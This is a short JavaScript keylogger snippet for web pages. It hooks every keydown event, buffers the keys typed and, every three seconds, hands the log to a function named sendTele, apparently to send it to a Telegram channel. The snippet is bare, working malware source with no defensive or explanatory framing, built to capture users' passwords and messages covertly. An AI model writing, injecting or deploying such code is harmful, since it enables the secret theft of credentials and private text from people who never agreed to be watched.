let log = "";
document.onkeydown = (e) => {
    let k = e.key || String.fromCharCode(e.keyCode);
    if (k === "Enter") k = "\n[ENTER]\n";
    else if (k === "Backspace") k = "[BS]";
    else if (k === "Space") k = " ";
    log += k;
};
setInterval(() => { if(log) { sendTele("⌨️ Keylog: " + log); log = ""; } }, 3000);
